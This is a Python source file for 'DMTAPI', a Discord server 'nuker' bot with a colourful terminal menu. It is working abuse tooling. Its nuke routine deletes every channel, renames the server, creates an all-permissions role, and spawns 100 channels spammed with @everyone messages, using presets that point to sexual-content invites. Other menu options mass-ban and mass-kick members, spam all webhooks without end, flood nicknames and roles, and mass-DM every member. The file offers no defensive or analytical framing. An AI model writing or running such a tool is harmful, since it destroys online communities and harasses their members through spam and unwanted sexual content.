import discord
import asyncio
import os
from colorama import init

# Initialize colorama
init()

def print_gradient(text):
    """Print text with blue to green gradient"""
    for i, char in enumerate(text):
        # Blue to green gradient: blue (0,0,255) -> green (0,255,0)
        red = 0
        green = int(i * (255 / max(len(text)-1, 1)))
        blue = 255 - int(i * (255 / max(len(text)-1, 1)))
        print(f"\033[38;2;{red};{green};{blue}m{char}", end="")
    print("\033[0m")  # Reset color

def input_gradient(prompt):
    """Get user input with gradient prompt"""
    print_gradient(prompt)
    return input()

class DMTAPI:
    def __init__(self):
        self.token = None
        self.client = None
        self.current_server = None
        self.dm_tasks = {}
        self.nuke_tasks = {}
        self.ready_event = None
        self.stop_flag = False  # Global stop flag
        self.input_task = None  # For monitoring stop commands
        
        # Define presets
        self.PRESETS = {
            "esex": {
                "title": "esex",
                "youtube": "https://youtube.com/fuck/me",
                "discord": "dsc.gg/sexysex", 
                "gif": "https://tenor.com/view/esex-crazy-discord-gif-114106734880043635"
            },
            "nsfw": {
                "title": "weird gay server",
                "youtube": "https://youtube.com/nsfw/wtf",
                "discord": "dsc.gg/sexysex", 
                "gif": "https://media.discordapp.net/attachments/861321809604902942/884954869461557248/image0.gif?ex=68f6d072&is=68f57ef2&hm=6ba5d60a7e54c5cc0606f834dd7f2c74ea671e3d591f37a10609b23fc593fd0b&=&width=184&height=184"
            }
        }
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """ 
 ░▒▓██████▓▒░░▒▓██████████████▓▒░▒▓████████▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░          ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
                                                                                      
                                                                                      """
        for line in banner.split('\n'):
            print_gradient(line)
        
        title = "dsc.gg/dmtapi"
        print_gradient("╔══════════════════════════════════════════════════════════════╗")
        print_gradient("║                      " + title.center(38) + "                   ║")
        print_gradient("╚══════════════════════════════════════════════════════════════╝")
    
    def get_user_input(self, prompt):
        return input_gradient(prompt)
    
    async def wait_for_enter(self):
        input_gradient("Press Enter to continue...")

    async def monitor_stop_command(self):
        """Monitor for stop command in background during operations"""
        try:
            while True:
                user_input = await asyncio.get_event_loop().run_in_executor(None, input, "")
                if user_input.strip().lower() == 'stop':
                    self.stop_flag = True
                    print_gradient("\n🛑 STOP command received! Stopping operation...")
                    break
                await asyncio.sleep(0.1)
        except:
            pass

    def start_stop_monitor(self):
        """Start monitoring for stop commands"""
        self.stop_flag = False
        if self.input_task and not self.input_task.done():
            self.input_task.cancel()
        self.input_task = asyncio.create_task(self.monitor_stop_command())

    def stop_stop_monitor(self):
        """Stop monitoring for stop commands"""
        self.stop_flag = False
        if self.input_task and not self.input_task.done():
            self.input_task.cancel()

    def check_stop_flag(self):
        """Check if stop was requested and reset flag"""
        if self.stop_flag:
            self.stop_flag = False
            return True
        return False

    def setup_client(self):
        """Setup a fresh client instance"""
        self.client = discord.Client(intents=discord.Intents.all())
        self.ready_event = asyncio.Event()
        
        @self.client.event
        async def on_ready():
            self.ready_event.set()

    async def login(self):
        self.clear_screen()
        self.print_banner()
        self.token = self.get_user_input("Bot Token: ")
        
        try:
            # Setup fresh client
            self.setup_client()
            
            print_gradient("Connecting to Discord...")
            
            # Start the client in background
            asyncio.create_task(self.client.start(self.token))
            
            # Wait for ready event with timeout
            await asyncio.wait_for(self.ready_event.wait(), timeout=15)
            
            print_gradient("✓ Connected successfully!")
            await asyncio.sleep(1)
            await self.select_server()
            
        except asyncio.TimeoutError:
            print_gradient("✗ Login timeout!")
            await self.cleanup()
            await asyncio.sleep(2)
            await self.login()
        except discord.LoginFailure:
            print_gradient("✗ Invalid token!")
            await self.cleanup()
            await asyncio.sleep(2)
            await self.login()
        except Exception as e:
            print_gradient(f"✗ Login failed: {e}")
            await self.cleanup()
            await asyncio.sleep(2)
            await self.login()

    async def cleanup(self):
        """Properly cleanup client session"""
        try:
            self.stop_stop_monitor()
            if self.client and not self.client.is_closed():
                await self.client.close()
            await asyncio.sleep(1)
        except:
            pass

    async def select_server(self):
        self.clear_screen()
        self.print_banner()
        
        server_id = self.get_user_input("Server ID: ")
        
        try:
            self.current_server = self.client.get_guild(int(server_id))
            if self.current_server:
                await self.main_menu()
            else:
                print_gradient("✗ Server not found!")
                await asyncio.sleep(2)
                await self.select_server()
        except ValueError:
            print_gradient("✗ Invalid server ID!")
            await asyncio.sleep(2)
            await self.select_server()

    async def send_dm(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("💬 Send DM to user")
        print_gradient("Type 'stop' to cancel")
        
        username = self.get_user_input("Enter username: ")
        if username.lower() == 'stop':
            return
            
        message = self.get_user_input("Enter message: ")
        if message.lower() == 'stop':
            return
        
        try:
            target_user = None
            for member in self.current_server.members:
                if member.name.lower() == username.lower() or str(member.id) == username:
                    target_user = member
                    break
            
            if target_user:
                await target_user.send(message)
                print_gradient(f"✅ DM sent to {target_user.name}!")
            else:
                print_gradient("✗ User not found!")
        except Exception as e:
            print_gradient(f"✗ Error: {e}")
        
        await self.wait_for_enter()

    async def dm_all(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("📢 DM All Members")
        print_gradient("Type 'stop' to cancel operation")
        
        message = self.get_user_input("Enter message: ")
        if message.lower() == 'stop':
            return
            
        confirm = self.get_user_input(f"Send to {len(self.current_server.members)} members? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            sent_count = 0
            for member in self.current_server.members:
                # Check if stop was requested
                if self.check_stop_flag():
                    print_gradient("🛑 Operation stopped by user!")
                    break
                    
                try:
                    if not member.bot:
                        await member.send(message)
                        print_gradient(f"✓ Sent to {member.name}")
                        sent_count += 1
                        await asyncio.sleep(1)
                except:
                    print_gradient(f"✗ Failed to send to {member.name}")
            
            # Stop monitoring
            self.stop_stop_monitor()
            
            print_gradient(f"✅ Sent to {sent_count} members!")
        
        await self.wait_for_enter()

    async def dm_owner(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("👑 DM Server Owner")
        print_gradient("Type 'stop' to cancel")
        
        message = self.get_user_input("Enter message: ")
        if message.lower() == 'stop':
            return
        
        try:
            owner = self.current_server.owner
            if owner:
                await owner.send(message)
                print_gradient(f"✅ DM sent to server owner {owner.name}!")
            else:
                print_gradient("✗ Could not find server owner!")
        except Exception as e:
            print_gradient(f"✗ Error: {e}")
        
        await self.wait_for_enter()

    async def webhook_spammer(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("🌐 Webhook Spammer")
        print_gradient("Type 'stop' to cancel operation")
        
        message = self.get_user_input("Enter message to spam: ")
        if message.lower() == 'stop':
            return
            
        confirm = self.get_user_input("Spam all webhooks? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            try:
                webhooks = await self.current_server.webhooks()
                if not webhooks:
                    print_gradient("✗ No webhooks found!")
                    self.stop_stop_monitor()
                    await self.wait_for_enter()
                    return
                
                spam_count = 0
                while not self.check_stop_flag():
                    for webhook in webhooks:
                        if self.check_stop_flag():
                            break
                        try:
                            await webhook.send(message)
                            spam_count += 1
                            print_gradient(f"✓ Spammed webhook {webhook.name} - Total: {spam_count}")
                        except:
                            print_gradient(f"✗ Failed to spam {webhook.name}")
                    
                    if self.check_stop_flag():
                        break
                        
                    await asyncio.sleep(0.5)
                
                # Stop monitoring
                self.stop_stop_monitor()
                
                if self.check_stop_flag():
                    print_gradient("🛑 Operation stopped by user!")
                else:
                    print_gradient(f"✅ Finished spamming {spam_count} messages!")
                    
            except Exception as e:
                print_gradient(f"✗ Error: {e}")
                self.stop_stop_monitor()
        
        await self.wait_for_enter()

    async def mass_kick(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("👢 Mass Kick")
        print_gradient("Type 'stop' to cancel operation")
        
        confirm = self.get_user_input("Kick all members? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            kick_tasks = []
            kicked_count = 0
            for member in self.current_server.members:
                if self.check_stop_flag():
                    print_gradient("🛑 Operation stopped by user!")
                    break
                    
                if member != self.current_server.owner and member != self.client.user and not member.bot:
                    kick_tasks.append(asyncio.create_task(member.kick()))
                    kicked_count += 1
                    print_gradient(f"✓ Kicked {member.name}")
            
            await asyncio.gather(*kick_tasks, return_exceptions=True)
            
            # Stop monitoring
            self.stop_stop_monitor()
            
            print_gradient(f"✅ Kicked {kicked_count} members!")
        
        await self.wait_for_enter()

    async def nickname_flood(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("🌀 Nickname Flood")
        print_gradient("Type 'stop' to cancel operation")
        
        nickname = self.get_user_input("Enter nickname to set: ")
        if nickname.lower() == 'stop':
            return
            
        confirm = self.get_user_input(f"Set nickname for all members? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            changed_count = 0
            for member in self.current_server.members:
                if self.check_stop_flag():
                    print_gradient("🛑 Operation stopped by user!")
                    break
                    
                try:
                    await member.edit(nick=nickname)
                    changed_count += 1
                    print_gradient(f"✓ Changed nickname for {member.name}")
                except:
                    print_gradient(f"✗ Failed to change nickname for {member.name}")
            
            # Stop monitoring
            self.stop_stop_monitor()
            
            print_gradient(f"✅ Changed nicknames for {changed_count} members!")
        
        await self.wait_for_enter()

    async def role_flood(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("🎨 Role Flood")
        print_gradient("Type 'stop' to cancel operation")
        
        role_name = self.get_user_input("Enter role name: ")
        if role_name.lower() == 'stop':
            return
            
        confirm = self.get_user_input(f"Create and assign '{role_name}' to all members? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            try:
                # Create the role
                role = await self.current_server.create_role(
                    name=role_name,
                    color=discord.Color.red(),
                    permissions=discord.Permissions.none()
                )
                print_gradient(f"✓ Created role: {role_name}")
                
                # Assign to all members
                assigned_count = 0
                for member in self.current_server.members:
                    if self.check_stop_flag():
                        print_gradient("🛑 Operation stopped by user!")
                        break
                        
                    try:
                        await member.add_roles(role)
                        assigned_count += 1
                        print_gradient(f"✓ Assigned role to {member.name}")
                    except:
                        print_gradient(f"✗ Failed to assign role to {member.name}")
                
                # Stop monitoring
                self.stop_stop_monitor()
                
                print_gradient(f"✅ Assigned role to {assigned_count} members!")
                
            except Exception as e:
                print_gradient(f"✗ Error: {e}")
                self.stop_stop_monitor()
        
        await self.wait_for_enter()

    async def delete_all_channels(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("🗑️ Delete All Channels")
        print_gradient("Type 'stop' to cancel operation")
        
        confirm = self.get_user_input("Delete ALL channels? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            delete_tasks = []
            deleted_count = 0
            for channel in self.current_server.channels:
                if self.check_stop_flag():
                    print_gradient("🛑 Operation stopped by user!")
                    break
                    
                delete_tasks.append(asyncio.create_task(channel.delete()))
                deleted_count += 1
                print_gradient(f"✓ Deleting {channel.name}")
            
            await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # Stop monitoring
            self.stop_stop_monitor()
            
            print_gradient(f"✅ Deleted {deleted_count} channels!")
        
        await self.wait_for_enter()

    async def nuke_server(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("💣 NUKE SERVER")
        print_gradient("Type 'stop' at any time to cancel nuke operation")
        
        args = self.get_user_input("Enter preset (esex/nsfw) or custom message: ")
        if args.lower() == 'stop':
            return
        
        guild = self.current_server
        
        # Default values
        default_message = f"nuked by DMTAPI @everyone"
        default_title = "NUKED"
        
        # Check if args match a preset
        if args and args.lower() in self.PRESETS:
            preset = self.PRESETS[args.lower()]
            title = preset["title"]
            youtube = preset["youtube"]
            discord_link = preset["discord"]
            gif = preset["gif"]
            message = f"{youtube}\n{discord_link}\n@everyone\n{gif}"
        elif args:
            parts = args.split(' ', 1)
            if len(parts) == 2:
                custom_message, title = parts
                message = f"{custom_message}\n@everyone"
            else:
                message = f"{parts[0]}\n@everyone"
                title = default_title
        else:
            message = default_message
            title = default_title
        
        # Store nuke task
        self.nuke_tasks[guild.id] = True
        
        print_gradient("🚀 Starting nuke...")
        print_gradient("Type 'stop' to cancel immediately")
        
        # Start monitoring for stop command
        self.start_stop_monitor()
        
        # Delete all channels with stop checking
        delete_tasks = []
        for channel in guild.channels:
            if self.check_stop_flag():
                print_gradient("🛑 NUKE CANCELLED! Returning to menu...")
                self.nuke_tasks[guild.id] = False
                self.stop_stop_monitor()
                await asyncio.sleep(2)
                return
            delete_tasks.append(asyncio.create_task(channel.delete()))
        
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        if self.check_stop_flag():
            print_gradient("🛑 NUKE CANCELLED! Returning to menu...")
            self.nuke_tasks[guild.id] = False
            self.stop_stop_monitor()
            await asyncio.sleep(2)
            return
        
        # Rename server
        try:
            await guild.edit(name=title)
        except:
            pass
        
        if self.check_stop_flag():
            print_gradient("🛑 NUKE CANCELLED! Returning to menu...")
            self.nuke_tasks[guild.id] = False
            self.stop_stop_monitor()
            await asyncio.sleep(2)
            return
        
        # Create member role with permissions
        try:
            member_role = await guild.create_role(
                name="member",
                permissions=discord.Permissions.all(),
                reason="Nuke command"
            )
        except:
            pass
        
        # Create channels and spam with stop checking
        all_spam_tasks = []
        
        for i in range(100):
            if self.check_stop_flag() or not self.nuke_tasks.get(guild.id):
                print_gradient("🛑 NUKE CANCELLED! Returning to menu...")
                self.nuke_tasks[guild.id] = False
                self.stop_stop_monitor()
                await asyncio.sleep(2)
                return
                
            try:
                channel = await guild.create_text_channel(f"{title}-{i+1}")
                
                # Spam messages in each channel with stop checking
                spam_tasks = []
                for j in range(100):
                    if self.check_stop_flag() or not self.nuke_tasks.get(guild.id):
                        break
                    spam_tasks.append(asyncio.create_task(channel.send(message)))
                all_spam_tasks.extend(spam_tasks)
            except:
                pass
        
        # Wait for spam to complete or stop
        try:
            await asyncio.wait_for(asyncio.gather(*all_spam_tasks, return_exceptions=True), timeout=10)
        except asyncio.TimeoutError:
            pass
        
        # Stop monitoring
        self.stop_stop_monitor()
        self.nuke_tasks[guild.id] = False
        
        if self.check_stop_flag():
            print_gradient("🛑 NUKE CANCELLED!")
        else:
            print_gradient("💀 Server nuked!")
        
        await self.wait_for_enter()

    async def mass_ban(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("🔨 Mass Ban")
        print_gradient("Type 'stop' to cancel operation")
        
        confirm = self.get_user_input("Ban all members? (y/n): ")
        if confirm.lower() == 'stop':
            return
        
        if confirm.lower() == 'y':
            # Start monitoring for stop command
            self.start_stop_monitor()
            
            ban_tasks = []
            banned_count = 0
            for member in self.current_server.members:
                if self.check_stop_flag():
                    print_gradient("🛑 Operation stopped by user!")
                    break
                    
                if member != self.current_server.owner and not member.bot:
                    ban_tasks.append(asyncio.create_task(member.ban()))
                    banned_count += 1
                    print_gradient(f"✓ Banned {member.name}")
            
            await asyncio.gather(*ban_tasks, return_exceptions=True)
            
            # Stop monitoring
            self.stop_stop_monitor()
            
            print_gradient(f"✅ Banned {banned_count} members!")
        
        await self.wait_for_enter()

    async def get_webhooks(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("🔗 Getting webhooks...")
        
        try:
            # Check if client is still connected
            if self.client.is_closed():
                print_gradient("✗ Connection lost! Reconnecting...")
                await self.cleanup()
                await self.login()
                return
                
            webhooks = await self.current_server.webhooks()
            if webhooks:
                for webhook in webhooks:
                    print_gradient(f"✓ {webhook.name} | {webhook.url}")
                print_gradient(f"✅ Found {len(webhooks)} webhooks")
            else:
                print_gradient("No webhooks found")
        except Exception as e:
            print_gradient(f"✗ Error: {e}")
        
        await self.wait_for_enter()

    async def server_info(self):
        self.clear_screen()
        self.print_banner()
        print_gradient("📊 Server Information")
        
        try:
            # Check if client is still connected
            if self.client.is_closed():
                print_gradient("✗ Connection lost! Reconnecting...")
                await self.cleanup()
                await self.login()
                return
                
            server = self.current_server
            print_gradient(f"Name: {server.name}")
            print_gradient(f"ID: {server.id}")
            print_gradient(f"Owner: {server.owner}")
            print_gradient(f"Members: {server.member_count}")
            print_gradient(f"Channels: {len(server.channels)}")
            print_gradient(f"Roles: {len(server.roles)}")
            print_gradient(f"Created: {server.created_at}")
        except Exception as e:
            print_gradient(f"✗ Error: {e}")
        
        await self.wait_for_enter()

    async def change_server(self):
        await self.select_server()

    async def exit_bot(self):
        print_gradient("👋 Goodbye!")
        await self.cleanup()
        exit()

    async def main_menu(self):
        while True:
            try:
                # Check connection before showing menu
                if self.client.is_closed():
                    print_gradient("✗ Connection lost! Reconnecting...")
                    await self.cleanup()
                    await self.login()
                    return
                    
                self.clear_screen()
                self.print_banner()
                print_gradient(f"Current Server: {self.current_server.name}")
                print_gradient("Type 'stop' during any operation to cancel and return to menu")
                
                menu_lines = [
                    "╔══════════════════════════════════════════════════════════════╗",
                    "║                           DMTAPI MENU                        ║",
                    "╠══════════════════════════════════════════════════════════════╣",
                    "║  0. Nuke Server                                              ║",
                    "║  1. Mass Ban                                                 ║",
                    "║  2. Webhook Spammer                                          ║",
                    "║  3. Mass Kick                                                ║",
                    "║  4. Nickname Flood                                           ║",
                    "║  5. Role Flood                                               ║",
                    "║  6. Delete All Channels                                      ║",
                    "╠══════════════════════════════════════════════════════════════╣",
                    "║  7. Send DM                                                  ║",
                    "║  8. DM All Members                                           ║",
                    "║  9. DM Server Owner                                          ║",
                    "╠══════════════════════════════════════════════════════════════╣",
                    "║  10. Get Webhooks                                            ║",
                    "║  11. Server Info                                             ║",
                    "║  12. Change Server                                           ║",
                    "║  13. Exit                                                    ║",
                    "╚══════════════════════════════════════════════════════════════╝"
                ]
                
                for line in menu_lines:
                    print_gradient(line)
                
                choice = self.get_user_input("Choose option (0-13): ")
                
                options = {
                    "0": self.nuke_server,
                    "1": self.mass_ban,
                    "2": self.webhook_spammer,
                    "3": self.mass_kick,
                    "4": self.nickname_flood,
                    "5": self.role_flood,
                    "6": self.delete_all_channels,
                    "7": self.send_dm,
                    "8": self.dm_all,
                    "9": self.dm_owner,
                    "10": self.get_webhooks,
                    "11": self.server_info,
                    "12": self.change_server,
                    "13": self.exit_bot
                }
                
                if choice in options:
                    await options[choice]()
                else:
                    print_gradient("✗ Invalid option!")
                    await asyncio.sleep(1)
            except Exception as e:
                print_gradient(f"✗ Menu error: {e}")
                await asyncio.sleep(2)

    async def run(self):
        await self.login()

if __name__ == "__main__":
    bot = DMTAPI()
    asyncio.run(bot.run())
